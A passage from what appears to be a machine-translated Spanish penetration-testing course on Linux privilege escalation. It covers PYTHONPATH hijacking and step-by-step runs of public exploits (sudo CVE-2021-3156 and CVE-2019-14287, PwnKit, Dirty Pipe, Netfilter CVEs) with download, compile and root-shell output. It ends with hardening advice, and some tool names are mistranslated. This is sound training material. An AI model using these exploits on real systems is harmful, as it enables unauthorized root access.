En la sección anterior, tocamos el término `PYTHONPATH`, sin embargo, no explicó completamente su uso e importancia con respecto a la funcionalidad de Python. `PYTHONPATH` es una variable de entorno que indica qué directorio (o directorios) Python puede buscar módulos para importar. Esto es importante, ya que si un usuario puede manipular y establecer esta variable mientras ejecuta el binario python, puede redirigir efectivamente la funcionalidad de búsqueda de Python a un `user-defined` ubicación cuando llega el momento de importar módulos. Podemos ver si tenemos los permisos para establecer variables de entorno para el binario python comprobando nuestro `sudo` permisos:

#### Comprobación de permisos sudo

  Secuestro de la Biblioteca Python

```shell-session
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Como podemos ver en el ejemplo, se nos permite correr `/usr/bin/python3` bajo los permisos confiables de `sudo` y por lo tanto se les permite establecer variables de entorno para su uso con este binario por el `SETENV:` bandera que se está estableciendo. Es importante tener en cuenta que debido a la naturaleza confiable de `sudo`, cualquier variable de entorno definida antes de llamar al binario no está sujeta a ninguna restricción con respecto a poder establecer variables de entorno en el sistema. Esto significa que usar el `/usr/bin/python3` binario, podemos establecer efectivamente cualquier variable de entorno en el contexto de nuestro programa en ejecución. Intentemos hacerlo ahora usando el `psutil.py` script de la última sección.

#### Escalada de Privilegio usando PYTHONPATH Environment Variable

  Secuestro de la Biblioteca Python

```shell-session
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

En este ejemplo, movimos el script python anterior del `/usr/lib/python3.8` directorio a `/tmp`. Desde aquí llamamos una vez más `/usr/bin/python3` correr `mem_stats.py`, sin embargo, especificamos que el `PYTHONPATH` la variable contiene el `/tmp` directorio para que obligue a Python a buscar ese directorio buscando el `psutil` módulo para importar. Como podemos ver, una vez más hemos ejecutado con éxito nuestro script en el contexto de root.



# Sudo

---

El programa `sudo` se utiliza bajo sistemas operativos UNIX como Linux o macOS para iniciar procesos con los derechos de otro usuario. En la mayoría de los casos, se ejecutan comandos que solo están disponibles para los administradores. Sirve como una capa adicional de seguridad o una salvaguardia para evitar que el sistema y su contenido sean dañados por usuarios no autorizados. El `/etc/sudoers` file especifica qué usuarios o grupos pueden ejecutar programas específicos y con qué privilegios.

  Sudo

```shell-session
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

Una de las últimas vulnerabilidades para `sudo` lleva el CVE-2021-3156 y se basa en una vulnerabilidad de desbordamiento de búfer basado en memoria dinámica. Esto afectó a las versiones sudo:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- y otros

Para averiguar la versión de `sudo`, el siguiente comando es suficiente:

  Sudo

```shell-session
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31
```

Lo interesante de esta vulnerabilidad fue que había estado presente durante más de diez años hasta que se descubrió. También hay un público [Prueba de Concepto](https://github.com/blasty/CVE-2021-3156) eso se puede usar para esto. Podemos descargar esto a una copia del sistema de destino que hemos creado o, si tenemos una conexión a Internet, al sistema de destino en sí.

  Sudo

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

Al ejecutar el exploit, se nos puede mostrar una lista que enumerará todas las versiones disponibles de los sistemas operativos que pueden verse afectados por esta vulnerabilidad.

  Sudo

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

Podemos averiguar qué versión del sistema operativo estamos tratando con el siguiente comando:

  Sudo

```shell-session
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

A continuación, especificamos el ID respectivo para el sistema operativo de la versión y ejecutamos el exploit con nuestra carga útil.

  Sudo

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

---

## Bypass de la política de Sudo

Se encontró otra vulnerabilidad en 2019 que afectó a todas las versiones a continuación `1.8.28`, lo que permitió que los privilegios se intensificaran incluso con un comando simple. Esta vulnerabilidad tiene el [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) y requiere solo un único requisito previo. Tenía que permitir a un usuario en el `/etc/sudoers` archivo para ejecutar un comando específico.

  Sudo

```shell-session
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

De hecho, `Sudo` también permite ejecutar comandos con ID de usuario específicos, lo que ejecuta el comando con los privilegios del usuario que llevan el ID especificado. El ID del usuario específico se puede leer desde el `/etc/passwd` archivo.

  Sudo

```shell-session
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

De este modo, el ID para el usuario `cry0l1t3` sería `1005`. Si una ID negativa (`-1`) se ingresa en `sudo`, esto da como resultado el procesamiento de la ID `0`, que sólo el `root` tiene. Esto, por lo tanto, condujo a la cubierta raíz inmediata.

  Sudo

```shell-session
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```


# Polkit

---

PolicyKit (`polkit`) es un servicio de autorización en sistemas operativos basados en Linux que permite que el software del usuario y los componentes del sistema se comuniquen entre sí si el software del usuario está autorizado para hacerlo. Para verificar si el software del usuario está autorizado para esta instrucción, `polkit` se le pregunta. Es posible establecer cómo se otorgan los permisos de forma predeterminada para cada usuario y aplicación. Por ejemplo, para cada usuario, se puede establecer si la operación debe ser generalmente permitida o prohibida, o se debe requerir autorización como administrador o como usuario separado con una validez única, limitada por proceso, limitada por sesión o ilimitada. Para usuarios y grupos individuales, las autorizaciones se pueden asignar individualmente.

Polkit funciona con dos grupos de archivos.

1. acciones/políticas (`/usr/share/polkit-1/actions`)
2. reglas (`/usr/share/polkit-1/rules.d`)

Polkit también tiene `local authority` reglas que se pueden usar para establecer o eliminar permisos adicionales para usuarios y grupos. Las reglas personalizadas se pueden colocar en el directorio `/etc/polkit-1/localauthority/50-local.d` con la extensión de archivo `.pkla`.

PolKit también viene con tres programas adicionales:

- `pkexec`- ejecuta un programa con los derechos de otro usuario o con derechos de root
- `pkaction`- se puede utilizar para mostrar acciones
- `pkcheck`esto se puede usar para verificar si un proceso está autorizado para una acción específica

La herramienta más interesante para nosotros, en este caso, es `pkexec` porque realiza la misma tarea que `sudo` y puede ejecutar un programa con los derechos de otro usuario o root.

  Polkit

```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

En el `pkexec` herramienta, la vulnerabilidad de corrupción de memoria con el identificador [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) fue encontrado, también conocido como [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) y también conduce a la escalada de privilegios. Esta vulnerabilidad también estuvo oculta durante más de diez años, y nadie puede decir con precisión cuándo fue descubierta y explotada. Finalmente, en noviembre de 2021, esta vulnerabilidad se publicó y se solucionó dos meses después.

Para explotar esta vulnerabilidad, necesitamos descargar un [PoC](https://github.com/arthepsy/CVE-2021-4034) y compílelo en el sistema de destino en sí o en una copia que hayamos hecho.

  Polkit

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

Una vez que hayamos compilado el código, podemos ejecutarlo sin más preámbulos. Después de la ejecución, cambiamos del shell estándar (`sh`) a Bash (`bash`) y compruebe los ID del usuario.

  Polkit

```shell-session
cry0l1t3@nix02:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```


# Dirty Pipe


---

Una vulnerabilidad en el kernel de Linux, llamada [Tubo Sucio](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), permite la escritura no autorizada a archivos de usuario raíz en Linux. Técnicamente, la vulnerabilidad es similar a la [Vaca Sucia](https://dirtycow.ninja/) vulnerabilidad descubierta en 2016. Todos los kernels de la versión `5.8` a `5.17` son afectados y vulnerables a esta vulnerabilidad.

En términos simples, esta vulnerabilidad permite a un usuario escribir en archivos arbitrarios siempre que tenga acceso de lectura a estos archivos. También es interesante observar que los teléfonos Android también se ven afectados. Las aplicaciones de Android se ejecutan con derechos de usuario, por lo que una aplicación maliciosa o comprometida podría hacerse cargo del teléfono.

Esta vulnerabilidad se basa en tuberías. Las tuberías son un mecanismo de comunicación unidireccional entre procesos que son particularmente populares en los sistemas Unix. Por ejemplo, podríamos editar el `/etc/passwd` archiva y elimina el mensaje de contraseña para la raíz. Esto nos permitiría iniciar sesión con el `su` comando sin el mensaje de contraseña.

Para explotar esta vulnerabilidad, necesitamos descargar un [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) y compílelo en el sistema de destino en sí o en una copia que hayamos hecho.

#### Descargar Dirty Pipe Exploit

  Tubo Sucio

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

Después de compilar el código, tenemos dos exploits diferentes disponibles. La primera versión exploit (`exploit-1`) modifica el `/etc/passwd` y nos da un mensaje con privilegios de root. Para esto, necesitamos verificar la versión del kernel y luego ejecutar el exploit.

#### Verifique la versión de Kernel

  Tubo Sucio

```shell-session
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

#### Explotación

  Tubo Sucio

```shell-session
cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

Con la ayuda de la 2a versión exploit (`exploit-2`), podemos ejecutar binarios SUID con privilegios de root. Sin embargo, antes de que podamos hacer eso, primero necesitamos encontrar estos binarios SUID. Para ello, podemos utilizar el siguiente comando:

#### Encuentra Binarios SUID

  Tubo Sucio

```shell-session
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

Entonces podemos elegir un binario y especificar la ruta completa del binario como un argumento para el exploit y ejecutarlo.

#### Explotación

  Tubo Sucio

```shell-session
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```


# Netfilter

---

`Netfilter` es un módulo de kernel de Linux que proporciona, entre otras cosas, filtrado de paquetes, traducción de direcciones de red y otras herramientas relevantes para firewalls. Controla y regula el tráfico de red manipulando paquetes individuales en función de sus características y reglas. `Netfilter` también se llama la capa de software en el kernel de Linux. Cuando se reciben y envían paquetes de red, inicia la ejecución de otros módulos, como los filtros de paquetes. Estos módulos pueden entonces interceptar y manipular paquetes. Esto incluye los programas como `iptables` y `arptables`, que sirven como mecanismos de acción de la `Netfilter` sistema de gancho de la pila de protocolos IPv4 e IPv6.

Este módulo del kernel tiene tres funciones principales:

1. Desfragmentación del paquete
2. Seguimiento de conexión
3. Traducción de direcciones de red (NAT)

Cuando el módulo está activado, todos los paquetes IP son verificados por el `Netfilter` antes de que se envíen a la aplicación de destino del sistema propio o remoto. En 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), y también en 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), se encontraron varias vulnerabilidades que podrían conducir a una escalada de privilegios.

Muchas empresas tienen distribuciones de Linux preconfiguradas adaptadas a sus aplicaciones de software o viceversa. Esto les da a los desarrolladores y administradores, metafóricamente hablando, una "base dinámica" que es difícil de reemplazar. Esto requeriría adaptar el sistema a la aplicación de software o adaptar la aplicación al sistema más nuevo. Dependiendo del tamaño y la complejidad de la aplicación, esto puede tomar una gran cantidad de tiempo y esfuerzo. Esta es a menudo la razón por la que tantas empresas ejecutan distribuciones de Linux más antiguas y no actualizadas en producción.

Incluso si la compañía utiliza máquinas virtuales o contenedores como Docker, estos se basan en un kernel específico. La idea de aislar la aplicación de software del sistema host existente es un buen paso, pero hay muchas maneras de salir de dicho contenedor.

#### CVE-2021-22555

Versiones de kernel vulnerables: 2.6 - 5.11

  Netfilter

```shell-session
cry0l1t3@ubuntu:~$ uname -r

5.10.5-051005-generic
```

  Netfilter

```shell-session
cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit
cry0l1t3@ubuntu:~$ ./exploit

[+] Linux Privilege Escalation by theflow@ - 2021

[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[*] Initializing sockets and message queues...

[+] STAGE 1: Memory corruption
[*] Spraying primary messages...
[*] Spraying secondary messages...
[*] Creating holes in primary messages...
[*] Triggering out-of-bounds write...
[*] Searching for corrupted primary message...
[+] fake_idx: fff
[+] real_idx: fdf

...SNIP...

root@ubuntu:/home/cry0l1t3# id

uid=0(root) gid=0(root) groups=0(root)
```

#### CVE-2022-25636

Una vulnerabilidad reciente es [CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) y afecta al kernel de Linux 5.4 hasta la versión 5.6.10. Esto es `net/netfilter/nf_dup_netdev.c`, que puede otorgar privilegios de root a usuarios locales debido a la escritura fuera de límites. `Nick Gregory` escribió un muy detallado [artículo](https://nickgregory.me/post/2022/03/12/cve-2022-25636/) sobre cómo descubrió esta vulnerabilidad.

  Netfilter

```shell-session
cry0l1t3@ubuntu:~$ uname -r

5.13.0-051300-generic
```

Sin embargo, debemos tener cuidado con este exploit, ya que puede dañar el kernel, y se requerirá un reinicio para volver a acceder al servidor.

  Netfilter

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
cry0l1t3@ubuntu:~$ cd CVE-2022-25636
cry0l1t3@ubuntu:~$ make
cry0l1t3@ubuntu:~$ ./exploit

[*] STEP 1: Leak child and parent net_device
[+] parent net_device ptr: 0xffff991285dc0000
[+] child  net_device ptr: 0xffff99128e5a9000

[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device
[+] net_device struct freed

[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
[+] obtained net_device struct

[*] STEP 4: Leak kaslr
[*] kaslr leak: 0xffffffff823093c0
[*] kaslr base: 0xffffffff80ffefa0

[*] STEP 5: Release setxattrs, free net_device, and realloc it again
[+] obtained net_device struct

[*] STEP 6: rop :)

# id

uid=0(root) gid=0(root) groups=0(root)
```

#### CVE-2023-32233

Esta vulnerabilidad explota lo llamado `anonymous sets` en `nf_tables` usando el `Use-After-Free` vulnerabilidad en el Kernel de Linux hasta la versión `6.3.1`. Estos `nf_tables` son espacios de trabajo temporales para procesar solicitudes por lotes y, una vez que se realiza el procesamiento, se supone que estos conjuntos anónimos deben eliminarse (`Use-After-Free`) por lo que ya no se pueden usar. Debido a un error en el código, estos conjuntos anónimos no se manejan correctamente y aún pueden ser accedidos y modificados por el programa.

La explotación se realiza manipulando el sistema para utilizar el `cleared out` conjuntos anónimos para interactuar con la memoria del kernel. Al hacerlo, podemos ganar potencialmente `root` privilegios.

#### Prueba de Concepto

  Netfilter

```shell-session
cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
cry0l1t3@ubuntu:~$ cd CVE-2023-32233
cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

#### Explotación

  Netfilter

```shell-session
cry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit

[*] Netfilter UAF exploit

Using profile:
========
1                   race_set_slab                   # {0,1}
1572                race_set_elem_count             # k
4000                initial_sleep                   # ms
100                 race_lead_sleep                 # ms
600                 race_lag_sleep                  # ms
100                 reuse_sleep                     # ms
39d240              free_percpu                     # hex
2a8b900             modprobe_path                   # hex
23700               nft_counter_destroy             # hex
347a0               nft_counter_ops                 # hex
a                   nft_counter_destroy_call_offset # hex
ffffffff            nft_counter_destroy_call_mask   # hex
e8e58948            nft_counter_destroy_call_check  # hex
========

[*] Checking for available CPUs...
[*] sched_getaffinity() => 0 2
[*] Reserved CPU 0 for PWN Worker
[*] Started cpu_spinning_loop() on CPU 1
[*] Started cpu_spinning_loop() on CPU 2
[*] Started cpu_spinning_loop() on CPU 3
[*] Creating "/tmp/modprobe"...
[*] Creating "/tmp/trigger"...
[*] Updating setgroups...
[*] Updating uid_map...
[*] Updating gid_map...
[*] Signaling PWN Worker...
[*] Waiting for PWN Worker...

...SNIP...

[*] You've Got ROOT:-)

# id

uid=0(root) gid=0(root) groups=0(root)
```

Tenga en cuenta que estos exploits pueden ser muy inestables y pueden romper el sistema.


# Endurecimiento de Linux

---

El endurecimiento adecuado de Linux puede eliminar la mayoría, si no todas, las oportunidades para la escalada de privilegios locales. Se deben tomar los siguientes pasos, como mínimo, para reducir el riesgo de que un ataque pueda elevarse al acceso a nivel de raíz:

---

## Actualizaciones y Patching

Existen muchos exploits de escalado de privilegios rápidos y fáciles para kernels de Linux desactualizados y versiones vulnerables conocidas de servicios integrados y de terceros. Realizar actualizaciones periódicas eliminará algunas de las "frutas bajas" más bajas que se pueden aprovechar para escalar privilegios. En Ubuntu, el paquete [mejoras desatendidas](https://packages.ubuntu.com/jammy/admin/unattended-upgrades) se instala de forma predeterminada desde la versión 18.04 en adelante y se puede instalar manualmente en Ubuntu desde al menos 10.04 (Lucid). Los sistemas operativos basados en Debian que se remontan a antes de Jessie también tienen este paquete disponible. En los sistemas basados en Red Hat, el [yum-crón](https://man7.org/linux/man-pages/man8/yum-cron.8.html) el paquete realiza una tarea similar.

---

## Gestión de Configuración

Esta no es una lista exhaustiva, pero algunas medidas de endurecimiento simples son:

- Audite archivos y directorios grabables y cualquier binario establecido con el bit SUID.
- Asegúrese de que los trabajos cron y los privilegios sudo especifiquen los binarios utilizando la ruta absoluta.
- No almacene credenciales en texto claro en archivos legibles por el mundo.
- Limpie los directorios del hogar y la historia de la fiesta.
- Asegúrese de que los usuarios de bajo privilegio no puedan modificar ninguna biblioteca personalizada llamada por programas.
- Elimine los paquetes y servicios innecesarios que potencialmente aumenten la superficie de ataque.
- Considere implementar [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux), que proporciona controles de acceso adicionales en el sistema.

---

## Gestión de Usuarios

Debemos limitar el número de cuentas de usuario y cuentas de administrador en cada sistema, asegurarnos de que los intentos de inicio de sesión (válidos/inválidos) se registren y supervisen. También es una buena idea hacer cumplir una política de contraseña segura, rotar contraseñas periódicamente y restringir a los usuarios la reutilización de contraseñas antiguas mediante el uso del archivo /etc/security/opasswd con el módulo PAM. Debemos comprobar que los usuarios no se colocan en grupos que les dan derechos excesivos que no son necesarios para sus tareas cotidianas y limitar los derechos sudo en base al principio de menor privilegio.

Existen plantillas para herramientas de automatización de gestión de configuración como [Marioneta](https://puppet.com/use-cases/configuration-management/), [SaltStack](https://github.com/saltstack/salt), [Zabbix](https://en.wikipedia.org/wiki/Zabbix) y [Nagios](https://en.wikipedia.org/wiki/Nagios) para automatizar tales comprobaciones y se puede utilizar para enviar mensajes a un canal de Slack o casilla de correo electrónico, así como a través de otros métodos. Las acciones remotas (Zabbix) y las Acciones de Remediación (Nagios) se pueden usar para encontrar y corregir automáticamente estos problemas a través de una flota de nodos. Las herramientas como Zabbix también cuentan con funciones como la verificación de suma de comprobación, que se puede utilizar tanto para el control de versiones como para confirmar que los binarios confidenciales no han sido manipulados. Por ejemplo, a través del [vfs.archivo.cksum](https://www.zabbix.com/documentation/4.0/manual/config/items/itemtypes/zabbix_agent) archivo.

---

## Auditoría

Realizar comprobaciones periódicas de seguridad y configuración de todos los sistemas. Hay varias líneas de base de seguridad como la DISA [Guías de Implementación Técnica de Seguridad (STIGs)](https://public.cyber.mil/stigs/) eso se puede seguir para establecer un estándar de seguridad en todos los tipos y dispositivos del sistema operativo. Existen muchos marcos de cumplimiento, como [ISO27001](https://www.iso.org/isoiec-27001-information-security.html), [PCI-DSS](https://www.pcisecuritystandards.org/pci_security/), y [HIPAA](https://www.hhs.gov/hipaa/for-professionals/security/index.html)que puede ser utilizado por una organización para ayudar a establecer líneas de base de seguridad. Todos estos deben ser utilizados como guías de referencia y no la base para un programa de seguridad. Un programa de seguridad sólido debe tener controles adaptados a las necesidades de la organización, el entorno operativo y los tipos de datos que almacenan y procesan (es decir, información de salud personal, datos financieros, secretos comerciales o información disponible públicamente).

Una revisión de auditoría y configuración no es un reemplazo para una prueba de penetración u otros tipos de evaluaciones técnicas y prácticas y, a menudo, se considera un ejercicio de "comprobación" en el que una organización es "pasada" en una auditoría de controles para realizar el mínimo. Estas revisiones pueden ayudar a complementar el escaneo regular de vulnerabilidades y las pruebas de penetración y los programas sólidos de administración de parches, vulnerabilidades y configuraciones.

Una herramienta útil para auditar sistemas basados en Unix (Linux, macOS, BDS, etc.) es [Lince](https://github.com/CISOfy/lynis). Esta herramienta audita la configuración actual de un sistema y proporciona consejos de endurecimiento adicionales, teniendo en cuenta varios estándares. Puede ser utilizado por equipos internos como administradores de sistemas, así como terceros (auditores y probadores de penetración) para obtener una "línea de base" de la configuración de seguridad actual del sistema. Una vez más, esta herramienta u otras similares no deben reemplazar las técnicas manuales discutidas en este módulo, pero pueden ser un fuerte suplemento para cubrir áreas que pueden pasarse por alto.

Después de clonar todo el repositorio, podemos ejecutar la herramienta escribiendo `./lynis audit system` y recibir un informe completo.

  Endurecimiento de Linux

```shell-session
htb_student@NIX02:~$ ./lynis audit system

[ Lynis 3.0.1 ]

################################################################################
  Lynis comes with ABSOLUTELY NO WARRANTY. This is free software, and you are
  welcome to redistribute it under the terms of the GNU General Public License.
  See the LICENSE file for details about using this software.

  2007-2020, CISOfy - https://cisofy.com/lynis/
  Enterprise support available (compliance, plugins, interface and tools)
################################################################################


[+] Initializing program
------------------------------------

  ###################################################################
  #                                                                 #
  #   NON-PRIVILEGED SCAN MODE                                      #
  #                                                                 #
  ###################################################################

  NOTES:
  --------------
  * Some tests will be skipped (as they require root permissions)
  * Some tests might fail silently or give different results

  - Detecting OS...                                           [ DONE ]
  - Checking profiles...                                      [ DONE ]

  ---------------------------------------------------
  Program version:           3.0.1
  Operating system:          Linux
  Operating system name:     Ubuntu
  Operating system version:  16.04
  Kernel version:            4.4.0
  Hardware platform:         x86_64
  Hostname:                  NIX02
```

El escaneo resultante se dividirá en advertencias:

  Endurecimiento de Linux

```shell-session
Warnings (2):
  ----------------------------
  ! Found one or more cronjob files with incorrect file permissions (see log for details) [SCHD-7704] 
      https://cisofy.com/lynis/controls/SCHD-7704/

  ! systemd-timesyncd never successfully synchronized time [TIME-3185] 
      https://cisofy.com/lynis/controls/TIME-3185/
```

Sugerencias:

  Endurecimiento de Linux

```shell-session
Suggestions (53):
  ----------------------------
  * Set a password on GRUB boot loader to prevent altering boot configuration (e.g. boot in single user mode without password) [BOOT-5122] 
      https://cisofy.com/lynis/controls/BOOT-5122/

  * If not required, consider explicit disabling of core dump in /etc/security/limits.conf file [KRNL-5820] 
      https://cisofy.com/lynis/controls/KRNL-5820/

  * Run pwck manually and correct any errors in the password file [AUTH-9228] 
      https://cisofy.com/lynis/controls/AUTH-9228/

  * Configure minimum encryption algorithm rounds in /etc/login.defs [AUTH-9230] 
      https://cisofy.com/lynis/controls/AUTH-9230/
```

y una sección de detalles de escaneo general:

  Endurecimiento de Linux

```shell-session
Lynis security scan details:

  Hardening index : 60 [############        ]
  Tests performed : 256
  Plugins enabled : 2

  Components:
  - Firewall               [X]
  - Malware scanner        [X]

  Scan mode:
  Normal [ ]  Forensics [ ]  Integration [ ]  Pentest [V] (running non-privileged)

  Lynis modules:
  - Compliance status      [?]
  - Security audit         [V]
  - Vulnerability scan     [V]

  Files:
  - Test and debug information      : /home/mrb3n/lynis.log
  - Report data                     : /home/mrb3n/lynis-report.dat
```

La herramienta es útil para informar rutas de escalado de privilegios y realizar una verificación de configuración rápida y realizará aún más comprobaciones si se ejecuta como usuario raíz.

---

## Conclusión

Como hemos visto, hay varias formas de escalar privilegios en los sistemas Linux/Unix, desde simples configuraciones erróneas y exploits públicos para servicios vulnerables conocidos hasta explotar el desarrollo basado en bibliotecas personalizadas. Una vez que se obtiene el acceso raíz, se hace más fácil usarlo como punto de pivote para una mayor explotación de la red. El endurecimiento de Linux (y de todos los sistemas) es crítico para organizaciones de todos los tamaños. Las pautas y controles de mejores prácticas existen en muchas formas diferentes. Las revisiones deben incluir una combinación de pruebas manuales prácticas y revisión y escaneo de configuración automatizado y validación de los resultados.



